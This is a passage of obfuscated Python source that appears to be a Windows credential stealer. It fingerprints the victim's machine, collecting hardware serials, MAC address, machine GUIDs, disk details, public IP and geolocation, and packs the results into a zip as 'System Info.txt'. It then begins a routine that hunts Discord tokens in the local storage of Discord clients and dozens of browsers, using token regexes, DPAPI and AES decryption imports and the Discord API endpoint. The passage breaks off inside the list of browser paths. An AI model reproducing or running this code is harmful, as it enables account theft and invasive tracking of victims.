    try: NGAGJDEQPUFGMNLMYPCAGOLADDGLJPDHZUPYSULKXBBMBKAVRQUQMJSVSRKAOJLOUDCFETRDJWFIMSOJCVATYZ = RunPowershell("(Get-WmiObject -Class Win32_Processor).ProcessorId")
    except: NGAGJDEQPUFGMNLMYPCAGOLADDGLJPDHZUPYSULKXBBMBKAVRQUQMJSVSRKAOJLOUDCFETRDJWFIMSOJCVATYZ = None

    try: ABMXIKROUCJZTMUGHFXDBNCTTWQZSLFGJOYYWKABAAWHPUSDQLDSXP = RunPowershell("(Get-WmiObject -Class Win32_BIOS).OEMStringArray")
    except: ABMXIKROUCJZTMUGHFXDBNCTTWQZSLFGJOYYWKABAAWHPUSDQLDSXP = None

    try: FWLNJKBRSDJLFPIZVKCIFGBHZFVHCYVLXSTMLJPFOKTXSKQIJSERFYMDYOGKGRFPHGPEDIWSC = RunPowershell("(Get-WmiObject -Class Win32_SystemEnclosure).SMBIOSAssetTag")
    except: FWLNJKBRSDJLFPIZVKCIFGBHZFVHCYVLXSTMLJPFOKTXSKQIJSERFYMDYOGKGRFPHGPEDIWSC = None
        
    try:
        QJNGYLFWNHBJXBMWVGEXCIBPJQVICSITKTPSSGHQVVSDQZITYNHPEUDVLCNWJVXCF = []
        MPILJFONNIQSTPBXVPVGAUIZQFQHBLHKLJQYRKVCXBKHLUIQEREDY = ctypes.windll.kernel32.GetLogicalDrives()
        for v4r_letter in string.ascii_uppercase:
            if MPILJFONNIQSTPBXVPVGAUIZQFQHBLHKLJQYRKVCXBKHLUIQEREDY & 1:
                SKSSKILRIJKHIXIVYSJCKBQEGAPXPWMCAXMUNUBYOBHNPNMSASQOHRDRGPNCT = v4r_letter + ":\\"
                try:
                    WNFYEFSZBNIPUTATRKGISPFDYUJJAQQPVFOAOCVIIMRWCVJHDHHOQNRFEZRIFNZINDIAIWBXJUDMPRMTIBAHZR = ctypes.c_ulonglong(0)
                    CUOLNSDYXTEXHAEALXRVAWBHZKNWJGGTJJNZELYPRXVERZKDNDJAPVVIGNYZFYNRDETHWZPPQYUKVCCE = ctypes.c_ulonglong(0)
                    ctypes.windll.kernel32.GetDiskFreeSpaceExW(ctypes.c_wchar_p(SKSSKILRIJKHIXIVYSJCKBQEGAPXPWMCAXMUNUBYOBHNPNMSASQOHRDRGPNCT), None, ctypes.pointer(CUOLNSDYXTEXHAEALXRVAWBHZKNWJGGTJJNZELYPRXVERZKDNDJAPVVIGNYZFYNRDETHWZPPQYUKVCCE), ctypes.pointer(WNFYEFSZBNIPUTATRKGISPFDYUJJAQQPVFOAOCVIIMRWCVJHDHHOQNRFEZRIFNZINDIAIWBXJUDMPRMTIBAHZR))
                    GLAYCWMMJTHUCRWVQYKFNOJEVZVTWUTNECUPOYWXNTZOKBTFKWMMIQLEDLHUGSISCUAPIWVJSVQUPDRQC = CUOLNSDYXTEXHAEALXRVAWBHZKNWJGGTJJNZELYPRXVERZKDNDJAPVVIGNYZFYNRDETHWZPPQYUKVCCE.value
                    FJEVDIHVLFVBIUJGNNRFWNHIBDGVFKBTQCHIKVACTLCJRGTWOFFZGHELNBHGESNLXYXZLLCRSJTZXQBUSLKFZVOUFQH = WNFYEFSZBNIPUTATRKGISPFDYUJJAQQPVFOAOCVIIMRWCVJHDHHOQNRFEZRIFNZINDIAIWBXJUDMPRMTIBAHZR.value
                    BPCVNGVKNYQAJDBRAKFXEWSWHREYYJJYYHTTZCDSVGBGWHZOCCZEZLXAEAQZU = GLAYCWMMJTHUCRWVQYKFNOJEVZVTWUTNECUPOYWXNTZOKBTFKWMMIQLEDLHUGSISCUAPIWVJSVQUPDRQC - FJEVDIHVLFVBIUJGNNRFWNHIBDGVFKBTQCHIKVACTLCJRGTWOFFZGHELNBHGESNLXYXZLLCRSJTZXQBUSLKFZVOUFQH
                    HPXJEYFVTQIZILYWDMVJXWLKUQNIVHSFWHKEVTQSWKPMZOAJQWSVBXYAOGOYMH = win32api.GetVolumeInformation(SKSSKILRIJKHIXIVYSJCKBQEGAPXPWMCAXMUNUBYOBHNPNMSASQOHRDRGPNCT)[0]
                    drive = {
                        'drive': SKSSKILRIJKHIXIVYSJCKBQEGAPXPWMCAXMUNUBYOBHNPNMSASQOHRDRGPNCT,
                        'total': GLAYCWMMJTHUCRWVQYKFNOJEVZVTWUTNECUPOYWXNTZOKBTFKWMMIQLEDLHUGSISCUAPIWVJSVQUPDRQC,
                        'free': FJEVDIHVLFVBIUJGNNRFWNHIBDGVFKBTQCHIKVACTLCJRGTWOFFZGHELNBHGESNLXYXZLLCRSJTZXQBUSLKFZVOUFQH,
                        'used': BPCVNGVKNYQAJDBRAKFXEWSWHREYYJJYYHTTZCDSVGBGWHZOCCZEZLXAEAQZU,
                        'name': HPXJEYFVTQIZILYWDMVJXWLKUQNIVHSFWHKEVTQSWKPMZOAJQWSVBXYAOGOYMH,
                    }
                    QJNGYLFWNHBJXBMWVGEXCIBPJQVICSITKTPSSGHQVVSDQZITYNHPEUDVLCNWJVXCF.append(drive)
                except:
                    ()
            MPILJFONNIQSTPBXVPVGAUIZQFQHBLHKLJQYRKVCXBKHLUIQEREDY >>= 1

        WJUUFLMTVYUSMXXIPAKFXQMSJBZAJCETHTLPFJNLJTRIUTNIKQEIXLITAEUOKMOLKQHN = "   {:<7} {:<10} {:<10} {:<10} {:<20}".format("Drive:", "Free:", "Total:", "Use:", "Name:")
        for v4r_drive in QJNGYLFWNHBJXBMWVGEXCIBPJQVICSITKTPSSGHQVVSDQZITYNHPEUDVLCNWJVXCF:
            RBGXHVZFGVQJWIETNSHKICSTPUHMOLIMKFXZYZZUEUSOOXLWQPMSSLZPRLJJMUVCMNRKSWZHSAQNOAHM = (v4r_drive['used'] / v4r_drive['total']) * 100
            FJEVDIHVLFVBIUJGNNRFWNHIBDGVFKBTQCHIKVACTLCJRGTWOFFZGHELNBHGESNLXYXZLLCRSJTZXQBUSLKFZVOUFQH_gb = "{:.2f}GO".format(v4r_drive['free'] / (1024 ** 3))
            GLAYCWMMJTHUCRWVQYKFNOJEVZVTWUTNECUPOYWXNTZOKBTFKWMMIQLEDLHUGSISCUAPIWVJSVQUPDRQC_gb = "{:.2f}GO".format(v4r_drive['total'] / (1024 ** 3))
            RBGXHVZFGVQJWIETNSHKICSTPUHMOLIMKFXZYZZUEUSOOXLWQPMSSLZPRLJJMUVCMNRKSWZHSAQNOAHM_str = "{:.2f}%".format(RBGXHVZFGVQJWIETNSHKICSTPUHMOLIMKFXZYZZUEUSOOXLWQPMSSLZPRLJJMUVCMNRKSWZHSAQNOAHM)
            WJUUFLMTVYUSMXXIPAKFXQMSJBZAJCETHTLPFJNLJTRIUTNIKQEIXLITAEUOKMOLKQHN += "\n - {:<7} {:<10} {:<10} {:<10} {:<20}".format(v4r_drive['drive'], 
                                                                   FJEVDIHVLFVBIUJGNNRFWNHIBDGVFKBTQCHIKVACTLCJRGTWOFFZGHELNBHGESNLXYXZLLCRSJTZXQBUSLKFZVOUFQH_gb,
                                                                   GLAYCWMMJTHUCRWVQYKFNOJEVZVTWUTNECUPOYWXNTZOKBTFKWMMIQLEDLHUGSISCUAPIWVJSVQUPDRQC_gb,
                                                                   RBGXHVZFGVQJWIETNSHKICSTPUHMOLIMKFXZYZZUEUSOOXLWQPMSSLZPRLJJMUVCMNRKSWZHSAQNOAHM_str,
                                                                   v4r_drive['name'])
    except:
        WJUUFLMTVYUSMXXIPAKFXQMSJBZAJCETHTLPFJNLJTRIUTNIKQEIXLITAEUOKMOLKQHN = """   Drive:  Free:      Total:     Use:       Name:       
   None    None       None       None       None     
"""

    try:
        def IsPortable():
            try:
                battery = psutil.sensors_battery()
                return battery is not None and battery.power_plugged is not None
            except AttributeError:
                return False

        if IsPortable():
            VBEKUWFLTQQQZOGPBQXPCHNZBESRRKAVQGZCNAVHZAUMWADONEGUXWXSFCHREEEIXHWUYQKQWNJEG = 'Pc Portable'
        else:
            VBEKUWFLTQQQZOGPBQXPCHNZBESRRKAVQGZCNAVHZAUMWADONEGUXWXSFCHREEEIXHWUYQKQWNJEG = 'Pc Fixed'
    except:
        VBEKUWFLTQQQZOGPBQXPCHNZBESRRKAVQGZCNAVHZAUMWADONEGUXWXSFCHREEEIXHWUYQKQWNJEG = "None"

    try: ISOGWKSFEGCMJWWCGAWXUOIDDVWOYIBZNPEIXEORYQZEEYXYASVHCZFPSGNDJHWQZVIMSNT = len(screeninfo.get_monitors())
    except: ISOGWKSFEGCMJWWCGAWXUOIDDVWOYIBZNPEIXEORYQZEEYXYASVHCZFPSGNDJHWQZVIMSNT = "None"

    MBFPLPBUSVPMIQKBPNEGLBDORWLUAATLMNZUMTXDJFQKFXHFCGJZWGQYGWWPTQVNVERRAUTCJGRZKDR_system_info = "Yes"
    ZZWAHZLZXPFHHEANZFAAZPTNJINZUCOLUSQKXFAPKDUOYXYAJKIEBCTWIBEPTNPANENTZQNTEURGQMCAAZJKAKJWVRRLI = f"""
User Pc:
 - Hostname    : {WRKKJDYVKEKQDDHPNDCSLKSGGVUNSHXCIZGTHGOLAQLUCYAZFCJLRMAVBECJOPIFQLDCVTYBSCEDCZUZSMEWVRT}
 - Username    : {SZCNPOJILKSWMCXDBUMAUATSVEIKOJTLIPJNALNKJHWLNUFRLOFMJEITFPHIUOYDMSYB}
 - DisplayName : {HMXCICLUUUAZJSNJJPRWKUKWNNYLRFZZOKVVUFRMISGDMHDSNIUKNALUGSBUSRSMAYRPZIOFBGFOFJBMOVBMTDYCSUXDD}

System:
 - Plateform     : {VBEKUWFLTQQQZOGPBQXPCHNZBESRRKAVQGZCNAVHZAUMWADONEGUXWXSFCHREEEIXHWUYQKQWNJEG}
 - Exploitation  : {BWORLRQHCTQMGOGHSQGVKIECHAFWLIELZCMXXHJKBDRUSKSVQZCISPRDUPIPEPFYAXDCKNNFIVGDPYRZERBCUUU} {GSMNODBQUVIGDRODUAEYXYMMMYBJXGZOLIDYRMHSOFBRNYGAPSSRVASKLRVLXATVLMHHVBDBIDRWCXNHAQFWNZYVCXISKDTCOJ}
 - Screen Number : {ISOGWKSFEGCMJWWCGAWXUOIDDVWOYIBZNPEIXEORYQZEEYXYASVHCZFPSGNDJHWQZVIMSNT}

Peripheral:
 - CPU : {JERPUXWOVEYEKJLEBLKWTBZEGEYQYUSHVNWQVTTDSIMPNVTGHUUXPVEKIXFTJWCSEEFEAFIBPIIWOYGCRUUWUUKJ}, {EGAPFEDZCBHBEIRSHTBZGNUSAKQZWWGMMCPXNYJZRLEVPYNDIGXETHNPEEQPQHTBIYKMWUOC} 
 - GPU : {GBHHGBXNVKOLWDISQKGPXCOLKEBOECMDYIMAEFEBLTMNGLKRVIHUPCSNMRFTQGMWCF}
 - RAM : {EFZSHJOETPBNOHWDVNQSKUIGAONFRRLIRYMJTWYTUYMFIXQFJNWIMDIVCIDYREIKHTZPONLOXEROP}

Disk:
{WJUUFLMTVYUSMXXIPAKFXQMSJBZAJCETHTLPFJNLJTRIUTNIKQEIXLITAEUOKMOLKQHN}

Serial Number:
 - MAC                       : {TZZYNBOXMUUCVTZIQVUPYEJNNNZNSIUJKCPBAWKSQYXWRUZVNTRRQQRRKUDFW}
 - Machine Id                : {LOWDUDDLTCEFZAGVJIJUVVILDMNNKOUKKSMUEWDTIYEHCGLKFXKIKTNUZYFOJIAMRLWWGIVKXWFZPZONLCVPHB}
 - Machine Guid              : {IDAYBPZYCXKSWXZQEMVLEGCIBOILXNRICFOIIIYIKOZRJXTCGUPJBBOXSHKDBDFPKLULTMTVVCYLFQZJLHKDMFFOEMYAA}
 - Hw Profile Guid           : {XSOGKFFFJROCKAMXPHUNCEKDKNHKZJKWTKFUGWYQGUFYHBCMVRBUBUJDZCUMRFFJWJVELGS}
 - Nvidia System Id          : {WRIQCGTTBXBAHGXUYSLUWKAWOWFYGKXIYOZARGLTQERQMYCYEDIBYXRUSDIH}
 - Guid Serial Number        : {WJZSEBMEPFEPTPJMMBGNWOOFMHSYISVNCGABYNUCOEWDTYUBOCOCA}
 - Uuid Serial Number        : {WSJPYRESSIKWCCWJPJXRTQNPPIKMPQOKQTQDAGQGPCHWUQTESKAFOISONRBIEHEACPSSGINQQDWGRTISFRKTXINV}
 - Motherboard Serial Number : {YSGXSNUQHQFAADYRLZQYGAUCZQQXLGRRPJOTYASGSYIRIMXJOUFRQCNSUTBOFCRKNUQOAPP}
 - Motherboard Product       : {VJTNWCWQXDNWRHLYJLWLEUOWFLTNFOAOJCAMUOJEYCWKBASQRFEADRTIKDCMNJMJPRLKFQVEALZVOWFFKWWSFIETEOLVXXYXSB}
 - Motherboard Manufacturer  : {OBHTGSZPAYILXEFOHLQCIMGAGBMYSEDSHZNPPYWHGHREQMVHPWWBWRIHPBJLHLZRDEMCLSHS}
 - Processor Serial Number   : {NGAGJDEQPUFGMNLMYPCAGOLADDGLJPDHZUPYSULKXBBMBKAVRQUQMJSVSRKAOJLOUDCFETRDJWFIMSOJCVATYZ}
 - Bios Serial Number        : {FAXCCWDCHHKJSZYBOWTGAZSXNGLZIYIOLGBNLKPUCHGJMHEXAOSXXAPWLHOXGFIQFYLVALDNCWHQVETMLZCR}
 - Bios Release Date         : {HAPXNDAVECALMLNEVFSNISSAVYEGLTTZBOBBCFECFROETURLEVMMWXVDVUVUMVPPQOGKRMFJ}
 - Bios Version              : {MCJMWVFNFEDACRQPFCQWCATEYSSMVFWSKWVEUZMWYVHNVRWIJGVYRPBUPGVGHTOL}
 - System Bios Version       : {DGYQFGGFDSCHTXAUBVIEDDLMCODZCRLLUHBVWYGAYVLJIZNTLVPIGYSYOYHUYAMDGQA}
 - System Version            : {SMNLIODZVUKPJRARFUITYIDVLBJWOVFKNQUSNRNSCFXFIYEFEQBEIMYGKQGULPWMNDCZWXPOVYIRLEQP}
 - System Family             : {LLUIEZMBOQKAOBLRXDXBXXPHJROZDOKLDQDNDPLIZHVOSLMJFHDFLZPEODSBBLOAYPZAAINDRCWYHQ}
 - System Manufacturer       : {YXZTIFBSMNGMXSVNCIEKBLAHXMHWWZSMKLRMJRXBRFDTUHPASDBLXUGKCLJGJWAJHXTHELVIXYGXRYNSBUMLDYEXMKXG}
 - System Product            : {FXHBOPCILJDWIABUCBXEQLKFGITFSGGDSPEODIBCOTXNSGVZGKDBYSOXRSDVRYLOUZIBJWKFHXFGZTVGIDXYUNFAA}
 - System SKU                : {IOZSSBQZUFSBJGUVKGNZFJVMNCOQCBHVGRNHASIFZKRJFPORCRLTAWUWORFBHPPVZAEVHEKJLXWDYFHRG}
 - Oem String Serial Number  : {ABMXIKROUCJZTMUGHFXDBNCTTWQZSLFGJOYYWKABAAWHPUSDQLDSXP}
 - Asset Tag Serial Number   : {FWLNJKBRSDJLFPIZVKCIFGBHZFVHCYVLXSTMLJPFOKTXSKQIJSERFYMDYOGKGRFPHGPEDIWSC}

Ip:
 - Public : {GQQIBMMUAQUOYYHFYSOAQXVXRFDMRHHWFLFXGJMBVDTILRPJRPWJCSZPGOR}
 - Local  : {FCWIGGWDXVOQXSKLYALTEPUALSKHTRAIQBHYSGHYAFOTRSUZDALPIBMEKWRXHPKPNYWELBQCJQQQQTZH}

Ip Information:
 - Isp : {LONSYGUTKLYLLNJFFTSUQCHGALQFVCZCUUQYHEKSLGCCVBVQSDAJMQUFL}
 - Org : {EBBBYXTUBHMHMXFNUOJCMOEUMRTUFLEYTMRQYRGSZKBRVCVBHL}
 - As  : {YFSFSIKUVJBQNMWQGMIENHYBVUOSPYHJSVRQOVGJAAFCERLHHJGFQNAIKGZHRYRXCOVEGFWHSBFGGMEW}

Ip Location:
 - Country   : {CLICFSVOZNXLCGIISOLVCVVMMFUWYGJYWMTHSCRZMJCCGPTQBIEOKXQPMASMYZT} ({CLICFSVOZNXLCGIISOLVCVVMMFUWYGJYWMTHSCRZMJCCGPTQBIEOKXQPMASMYZT_code})
 - Region    : {SIPYGIVNNQJGJDUQIWDOUEEPORKBZLPRRNQNLIVXWQBGLGXVHFCZGUXADBRTXYTSRAYKNHWMYJPFASIZBJDTLFSGJRWARPHDG} ({SIPYGIVNNQJGJDUQIWDOUEEPORKBZLPRRNQNLIVXWQBGLGXVHFCZGUXADBRTXYTSRAYKNHWMYJPFASIZBJDTLFSGJRWARPHDG_code})
 - Zip       : {BMFBSLQUNIOXLVVRKUCVUEJTWXJHUTWETMWBJACABCKIFYQLRXNSKAGMVMORRYNYJCWTFHFNGGODZRTCNJGALQBEAR}
 - City      : {FDHQJQWJGLVTFJKZALVHTQBBECWSRBJEFBHWCRZETCTNDLEXOSHLHGGWVGBZGCEEDFNL}
 - Timezone  : {MYHFBDHTCBAHTUTGQWQCNPCOMMADLBHUYHRLPINGSRNZEEPNOTPOHPZGTBDGFTLZCLPJVQFEMZHZSW}
 - Longitude : {RVQIYNBWXXEWYSKYQYOJJFCXJWSXSOHXRSDVTTEVWFFYUHGVVNOVKZBTMJFPPWZEUBRNREXUKLUBQELFYQMJJUCDUFDNS}
 - Latitude  : {GWNFAZXSMKHFNOIGJWGAPDUGBHGJVZEUUUFPNRWXVQHQNBZETBXYPMZFYGHQCYTUJCURUSEOHCMNQF}
"""
    TXCIYPRPYNRKZAJLMDFSLPQNEREXVRPESXKXLMEJSMPHVFQQVTIDJXIVYFETNIZGOAMXZZLNIKOMQCJT.writestr("System Info.txt", ZZWAHZLZXPFHHEANZFAAZPTNJINZUCOLUSQKXFAPKDUOYXYAJKIEBCTWIBEPTNPANENTZQNTEURGQMCAAZJKAKJWVRRLI)

    return MBFPLPBUSVPMIQKBPNEGLBDORWLUAATLMNZUMTXDJFQKFXHFCGJZWGQYGWWPTQVNVERRAUTCJGRZKDR_system_info

def UTNSRPLYYTEYDMRKLYDJBHIJVUZHBATXJNHPCEEPVYIMDKSONRYKTFHFUGNHVMKJPKAHOKHPQYAMWZWXBYBZQIJWVNCUAYJBSDM(TXCIYPRPYNRKZAJLMDFSLPQNEREXVRPESXKXLMEJSMPHVFQQVTIDJXIVYFETNIZGOAMXZZLNIKOMQCJT):
    import os
    import re
    import json
    import base64
    import requests
    import psutil
    from Cryptodome.Cipher import AES
    from win32crypt import CryptUnprotectData

    PTECCOECWYCJHQKHCZTRDDZRENNQCFZJSVPIBWGLMWAGOLHRWIOYMKGRSYKOINAQMLXFGCYYLDIXEJR = ""
    CSGWQNYOPUUJUKJYRLYLLDRJAMEBYWUGAXDOSWZGJROQHYSSXSMCNZ = 0

    def WVFXFIKASWCFHNXHRCZLVZLMASGIJELORISEGWIJFOKJCJGZYREYWXQOETSEUYDOWYO():  
        ZBSLWDWVSCJZXMUKVPTCIOFIQLEIEVQHNPXGKWJQXWUFTMSTSBDVGKWSEQTYEEJCQHGDMADYGQLI = "https://discord.com/api/v9/users/@me"
        AHAKFLYDZHCNOOGIEOLBXUJWYTZLUXUFDKMZDBZIWNDILCQZUJBK = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        AHAKFLYDZHCNOOGIEOLBXUJWYTZLUXUFDKMZDBZIWNDILCQZUJBK_enc = r"dQw4w9WgXcQ:[^\"]*"
        NMWEXTLGAIXVTQMFENNYPTWEXMJXWVMKVXWTHWTDHOVBQZQIDHZMLBFYQSBQREHKFAQLDJCDAFWHNZRIIABTWCQYKVN = []
        KDXJCEUERBPMOTUNPDLNQRROIQAZXNCBQQVEVGAYEALMPCPZOQPVBGJTUGKANEUDWFHJRXIRLGMZ = []
        JNSALKDJDEWGGLTQXRHKOMEMMVRGIWVPHCHZCMTKVPLKNZEPSMXZZPDPQEAKKZSTB = {}

        JLLDPKKLKAACSLNUJNCIIFKKPTMXZBJJXDLWQVERWUZRFXNCLLJRPUUUGPNQPEEMLAZXFXPUPIYVFTQPJYFXJSIQVYKCSNOSGAHZ = [
            ("Discord",                os.path.join(QHAZYXXBAXKOWWQZTVSSTYLZVJVFQDVPGKSTGFBWPNKIGKYKGKLTQCQJPJYJSXESQEUCRXRKAYUOHEYHUKZXOEPL, "discord", "Local Storage", "leveldb"),                                                  ""),
            ("Discord Canary",         os.path.join(QHAZYXXBAXKOWWQZTVSSTYLZVJVFQDVPGKSTGFBWPNKIGKYKGKLTQCQJPJYJSXESQEUCRXRKAYUOHEYHUKZXOEPL, "discordcanary", "Local Storage", "leveldb"),                                            ""),
            ("Lightcord",              os.path.join(QHAZYXXBAXKOWWQZTVSSTYLZVJVFQDVPGKSTGFBWPNKIGKYKGKLTQCQJPJYJSXESQEUCRXRKAYUOHEYHUKZXOEPL, "Lightcord", "Local Storage", "leveldb"),                                                ""),
            ("Discord PTB",            os.path.join(QHAZYXXBAXKOWWQZTVSSTYLZVJVFQDVPGKSTGFBWPNKIGKYKGKLTQCQJPJYJSXESQEUCRXRKAYUOHEYHUKZXOEPL, "discordptb", "Local Storage", "leveldb"),                                               ""),
            ("Opera",                  os.path.join(QHAZYXXBAXKOWWQZTVSSTYLZVJVFQDVPGKSTGFBWPNKIGKYKGKLTQCQJPJYJSXESQEUCRXRKAYUOHEYHUKZXOEPL, "Opera Software", "Opera Stable", "Local Storage", "leveldb"),                           "opera.exe"),
            ("Opera GX",               os.path.join(QHAZYXXBAXKOWWQZTVSSTYLZVJVFQDVPGKSTGFBWPNKIGKYKGKLTQCQJPJYJSXESQEUCRXRKAYUOHEYHUKZXOEPL, "Opera Software", "Opera GX Stable", "Local Storage", "leveldb"),                        "opera.exe"),
            ("Opera Neon",             os.path.join(QHAZYXXBAXKOWWQZTVSSTYLZVJVFQDVPGKSTGFBWPNKIGKYKGKLTQCQJPJYJSXESQEUCRXRKAYUOHEYHUKZXOEPL, "Opera Software", "Opera Neon", "Local Storage", "leveldb"),                             "opera.exe"),
            ("Amigo",                  os.path.join(CDTMHPTTKYAOLSHDLBNPHDVJOWJPVRULACNMZZXTETVBYCHOLIHNBYJJVVRGWKXZWXDTVXJFELUXAVMCOYUIJWWCWTLY,   "Amigo", "User Data", "Local Storage", "leveldb"),                                       "amigo.exe"),
            ("Torch",                  os.path.join(CDTMHPTTKYAOLSHDLBNPHDVJOWJPVRULACNMZZXTETVBYCHOLIHNBYJJVVRGWKXZWXDTVXJFELUXAVMCOYUIJWWCWTLY,   "Torch", "User Data", "Local Storage", "leveldb"),                                       "torch.exe"),
            ("Kometa",                 os.path.join(CDTMHPTTKYAOLSHDLBNPHDVJOWJPVRULACNMZZXTETVBYCHOLIHNBYJJVVRGWKXZWXDTVXJFELUXAVMCOYUIJWWCWTLY,   "Kometa", "User Data", "Local Storage", "leveldb"),                                      "kometa.exe"),
            ("Orbitum",                os.path.join(CDTMHPTTKYAOLSHDLBNPHDVJOWJPVRULACNMZZXTETVBYCHOLIHNBYJJVVRGWKXZWXDTVXJFELUXAVMCOYUIJWWCWTLY,   "Orbitum", "User Data", "Local Storage", "leveldb"),                                     "orbitum.exe"),
            ("CentBrowser",            os.path.join(CDTMHPTTKYAOLSHDLBNPHDVJOWJPVRULACNMZZXTETVBYCHOLIHNBYJJVVRGWKXZWXDTVXJFELUXAVMCOYUIJWWCWTLY,   "CentBrowser", "User Data", "Local Storage", "leveldb"),                                 "centbrowser.exe"),
            ("7Star",                  os.path.join(CDTMHPTTKYAOLSHDLBNPHDVJOWJPVRULACNMZZXTETVBYCHOLIHNBYJJVVRGWKXZWXDTVXJFELUXAVMCOYUIJWWCWTLY,   "7Star", "7Star", "User Data", "Local Storage", "leveldb"),                              "7star.exe"),
            ("Sputnik",                os.path.join(CDTMHPTTKYAOLSHDLBNPHDVJOWJPVRULACNMZZXTETVBYCHOLIHNBYJJVVRGWKXZWXDTVXJFELUXAVMCOYUIJWWCWTLY,   "Sputnik", "Sputnik", "User Data", "Local Storage", "leveldb"),                          "sputnik.exe"),
            ("Vivaldi",                os.path.join(CDTMHPTTKYAOLSHDLBNPHDVJOWJPVRULACNMZZXTETVBYCHOLIHNBYJJVVRGWKXZWXDTVXJFELUXAVMCOYUIJWWCWTLY,   "Vivaldi", "User Data", "Default", "Local Storage", "leveldb"),                          "vivaldi.exe"),
            ("Google Chrome",          os.path.join(CDTMHPTTKYAOLSHDLBNPHDVJOWJPVRULACNMZZXTETVBYCHOLIHNBYJJVVRGWKXZWXDTVXJFELUXAVMCOYUIJWWCWTLY,   "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"),                 "chrome.exe"),
            ("Google Chrome",          os.path.join(CDTMHPTTKYAOLSHDLBNPHDVJOWJPVRULACNMZZXTETVBYCHOLIHNBYJJVVRGWKXZWXDTVXJFELUXAVMCOYUIJWWCWTLY,   "Google", "Chrome", "User Data", "Profile 1", "Local Storage", "leveldb"),               "chrome.exe"),
            ("Google Chrome",          os.path.join(CDTMHPTTKYAOLSHDLBNPHDVJOWJPVRULACNMZZXTETVBYCHOLIHNBYJJVVRGWKXZWXDTVXJFELUXAVMCOYUIJWWCWTLY,   "Google", "Chrome", "User Data", "Profile 2", "Local Storage", "leveldb"),               "chrome.exe"),
            ("Google Chrome",          os.path.join(CDTMHPTTKYAOLSHDLBNPHDVJOWJPVRULACNMZZXTETVBYCHOLIHNBYJJVVRGWKXZWXDTVXJFELUXAVMCOYUIJWWCWTLY,   "Google", "Chrome", "User Data", "Profile 3", "Local Storage", "leveldb"),               "chrome.exe"),
            ("Google Chrome",          os.path.join(CDTMHPTTKYAOLSHDLBNPHDVJOWJPVRULACNMZZXTETVBYCHOLIHNBYJJVVRGWKXZWXDTVXJFELUXAVMCOYUIJWWCWTLY,   "Google", "Chrome", "User Data", "Profile 4", "Local Storage", "leveldb"),               "chrome.exe"),
            ("Google Chrome",          os.path.join(CDTMHPTTKYAOLSHDLBNPHDVJOWJPVRULACNMZZXTETVBYCHOLIHNBYJJVVRGWKXZWXDTVXJFELUXAVMCOYUIJWWCWTLY,   "Google", "Chrome", "User Data", "Profile 5", "Local Storage", "leveldb"),               "chrome.exe"),
            ("Google Chrome SxS",      os.path.join(CDTMHPTTKYAOLSHDLBNPHDVJOWJPVRULACNMZZXTETVBYCHOLIHNBYJJVVRGWKXZWXDTVXJFELUXAVMCOYUIJWWCWTLY,   "Google", "Chrome SxS", "User Data", "Default", "Local Storage", "leveldb"),             "chrome.exe"),
            ("Google Chrome Beta",     os.path.join(CDTMHPTTKYAOLSHDLBNPHDVJOWJPVRULACNMZZXTETVBYCHOLIHNBYJJVVRGWKXZWXDTVXJFELUXAVMCOYUIJWWCWTLY,   "Google", "Chrome Beta", "User Data", "Default", "Local Storage", "leveldb"),            "chrome.exe"),
            ("Google Chrome Dev",      os.path.join(CDTMHPTTKYAOLSHDLBNPHDVJOWJPVRULACNMZZXTETVBYCHOLIHNBYJJVVRGWKXZWXDTVXJFELUXAVMCOYUIJWWCWTLY,   "Google", "Chrome Dev", "User Data", "Default", "Local Storage", "leveldb"),             "chrome.exe"),
            ("Google Chrome Unstable", os.path.join(CDTMHPTTKYAOLSHDLBNPHDVJOWJPVRULACNMZZXTETVBYCHOLIHNBYJJVVRGWKXZWXDTVXJFELUXAVMCOYUIJWWCWTLY,   "Google", "Chrome Unstable", "User Data", "Default", "Local Storage", "leveldb"),        "chrome.exe"),
            ("Google Chrome Canary",   os.path.join(CDTMHPTTKYAOLSHDLBNPHDVJOWJPVRULACNMZZXTETVBYCHOLIHNBYJJVVRGWKXZWXDTVXJFELUXAVMCOYUIJWWCWTLY,   "Google", "Chrome Canary", "User Data", "Default", "Local Storage", "leveldb"),          "chrome.exe"),
            ("Epic Privacy Browser",   os.path.join(CDTMHPTTKYAOLSHDLBNPHDVJOWJPVRULACNMZZXTETVBYCHOLIHNBYJJVVRGWKXZWXDTVXJFELUXAVMCOYUIJWWCWTLY,   "Epic Privacy Browser", "User Data", "Local Storage", "leveldb"),                        "epic.exe"),
            ("Microsoft Edge",         os.path.join(CDTMHPTTKYAOLSHDLBNPHDVJOWJPVRULACNMZZXTETVBYCHOLIHNBYJJVVRGWKXZWXDTVXJFELUXAVMCOYUIJWWCWTLY,   "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"),                "msedge.exe"),
            ("Uran",                   os.path.join(CDTMHPTTKYAOLSHDLBNPHDVJOWJPVRULACNMZZXTETVBYCHOLIHNBYJJVVRGWKXZWXDTVXJFELUXAVMCOYUIJWWCWTLY,   "uCozMedia", "Uran", "User Data", "Default", "Local Storage", "leveldb"),                "uran.exe"),
            ("Yandex",                 os.path.join(CDTMHPTTKYAOLSHDLBNPHDVJOWJPVRULACNMZZXTETVBYCHOLIHNBYJJVVRGWKXZWXDTVXJFELUXAVMCOYUIJWWCWTLY,   "Yandex", "YandexBrowser", "User Data", "Default", "Local Storage", "leveldb"),          "yandex.exe"),
            ("Yandex Canary",          os.path.join(CDTMHPTTKYAOLSHDLBNPHDVJOWJPVRULACNMZZXTETVBYCHOLIHNBYJJVVRGWKXZWXDTVXJFELUXAVMCOYUIJWWCWTLY,   "Yandex", "YandexBrowserCanary", "User Data", "Default", "Local Storage", "leveldb"),    "yandex.exe"),
            ("Yandex Developer",       os.path.join(CDTMHPTTKYAOLSHDLBNPHDVJOWJPVRULACNMZZXTETVBYCHOLIHNBYJJVVRGWKXZWXDTVXJFELUXAVMCOYUIJWWCWTLY,   "Yandex", "YandexBrowserDeveloper", "User Data", "Default", "Local Storage", "leveldb"), "yandex.exe"),
            ("Yandex Beta",            os.path.join(CDTMHPTTKYAOLSHDLBNPHDVJOWJPVRULACNMZZXTETVBYCHOLIHNBYJJVVRGWKXZWXDTVXJFELUXAVMCOYUIJWWCWTLY,   "Yandex", "YandexBrowserBeta", "User Data", "Default", "Local Storage", "leveldb"),      "yandex.exe"),
